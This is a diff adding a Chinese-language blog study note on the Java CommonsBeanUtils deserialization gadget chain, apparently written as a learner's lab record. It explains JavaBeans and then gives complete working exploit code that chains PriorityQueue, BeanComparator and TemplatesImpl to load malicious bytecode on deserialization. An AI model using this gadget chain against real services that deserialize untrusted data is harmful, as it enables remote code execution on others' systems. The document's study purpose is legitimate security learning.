@@ -2951,4 +2951,91 @@
         <tag>漏洞复现</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CommonsBeanUtils链学习笔记</title>
+    <url>/2025/02/27/CommonsBeanUtils%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>keep going🏃‍♀️，有了前面的基础，这个应该不是很难，但是要学习新的java知识</p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
+<li><p>jdk8u65</p>
+</li>
+<li><p>commons-beanutils 1.9.2</p>
+</li>
+</ul>
+<p>参考<a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >Drunkbaby师傅<i class="fas fa-external-link-alt"></i></a>给的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.9.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="CommonsBeanUtils介绍"><a href="#CommonsBeanUtils介绍" class="headerlink" title="CommonsBeanUtils介绍"></a>CommonsBeanUtils介绍</h4><p><strong>CommonsBeanUtils</strong>是一个Apache库里的工具，用来简化对 <strong>Java Bean</strong> 的操作，比如</p>
+<ul>
+<li>反射获取类的属性</li>
+<li>动态设置属性值</li>
+<li>类型转换</li>
+<li>Bean 之间的属性拷贝</li>
+</ul>
+<p><a class="link"   href="https://liaoxuefeng.com/books/java/oop/core/javabean/index.html" >Java Bean介绍文章<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>Java Bean</strong> 是符合特定规范的 Java 类，主要用于封装数据。其核心特征包括：</p>
+<ul>
+<li>必须有无参构造方法（可通过默认构造器或显式定义）。</li>
+<li>属性私有化（<code>private</code> 修饰），通过公共的 <code>getter</code> 和 <code>setter</code> 方法访问。可以利用IDE快速生成<code>getter</code>和<code>setter</code></li>
+<li>可序列化（实现 <code>Serializable</code> 接口，非强制但常见）。</li>
+</ul>
+<p>写一个JavaBean</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125; <span class="comment">// 无参构造</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>示例写一个User类，然后用Commons-BeanUtils 的<code>PropertyUtils.getProperty</code>静态方法，让使用者可以直接调用任意 JavaBean 的 getter 方法</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227194204.png" ></p>
+<p><code>PropertyUtils.getProperty()</code>传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性，刚刚的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(user, &quot;name&quot;);</span><br><span class="line">=</span><br><span class="line">user.getName(&quot;Flow&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>PropertyUtils.getProperty&#96; 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过PropertyUtils.getProperty(a,”b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter</p>
+<p>除了这个CommonsBeanUtils还有很多方法可以对JavaBean进行操作，等后续再接触</p>
+<h4 id="CommonsBeanUtils链分析"><a href="#CommonsBeanUtils链分析" class="headerlink" title="CommonsBeanUtils链分析"></a>CommonsBeanUtils链分析</h4><p>已知这条链子最后用的是恶意类加载，之前用到的链子尾部是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">  -&gt;TemplatesImpl#newTransformer()</span><br><span class="line">    -&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">      -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">        -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+
+<p>说是<code>getOutputProperties</code>算是一个getter方法，问了一下GPT，确实都符合条件</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227201901.png" ></p>
+<blockquote>
+<p>在 <strong>JavaBean规范</strong> 中，getter 方法的特点是：</p>
+<p>1.<strong>方法名以</strong> get <strong>开头</strong>（或者对于 boolean 类型是 is 开头）。</p>
+<p>2.<strong>后面跟着属性名的首字母大写版本</strong>。</p>
+<p>3.<strong>必须是</strong> public <strong>访问权限</strong>。</p>
+<p>4.<strong>返回一个属性的值</strong>。</p>
+</blockquote>
+<p>所以我们可以用<code>PropertyUtils.getProperty()</code>获取到，大概长这样</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>那现在看谁调用了<code>PropertyUtils.getProperty()</code>，找到一个<code>BeanComparator.compare()</code>，说到compare就熟了，前面CC4接触过，那就接上了！画了个图，看起来就是殊途同归</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227204042.png" ></p>
+<h4 id="CommonsBeanUtils链EXP编写"><a href="#CommonsBeanUtils链EXP编写" class="headerlink" title="CommonsBeanUtils链EXP编写"></a>CommonsBeanUtils链EXP编写</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">    beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>卡在这里，在思考要怎么把templates作为o1传入compare，这里可以先运行尝试一下，因为<code>PriorityQueue.add()</code>会自动跳到compare，顺着到链子后部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure>
+
+<p>这样执行会弹出计算机</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228001450.png" ></p>
+<p>因为BeanComparator刚好有<code>setProperty</code>方法，经过测试，下面这两句效果一样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beanComparator.setProperty(&quot;outputProperties&quot;);</span><br><span class="line">setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>我们的目的是只在反序列化的时候才弹计算机，所以现在先add两个不会触发恶意类加载的值</p>
+<p>这个时候 <code>beanComparator.setProperty(&quot;outputProperties&quot;);</code>这句要注释掉，不然add过程中走到compare()会报错，可以看调试的时候，o1是个整形，他么得 <code>outputProperties</code>，自然会报错，所以这一句要挪到add后</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228003345.png" ></p>
+<p>add后再用反射给priorityQueue的queue传入templates，设置BeanComparator.compare()的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>最后的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;); <span class="comment">// 设置BeanComparator.compare()的参数</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>); </span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>这条链其实不难找，在尝试自己写的时候有点狭隘，感觉对队列这个数据结构不熟悉也是，有些地方钻了牛角尖</p>
+<ul>
+<li>执行beanComparator的property反射修改在add前还是add后这里调了些时间</li>
+<li>反射修改里面的new Object[]{templates, templates}，亲测第一个对象一定要是templates，第二个对象可以随便</li>
+</ul>
+<p>记录一下过程中的纠结以后回头看可能会有新的感谢，以上有任何不对的欢迎找我指正🙏</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17588722.html" >https://www.cnblogs.com/1vxyz/p/17588722.html<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
 </search>
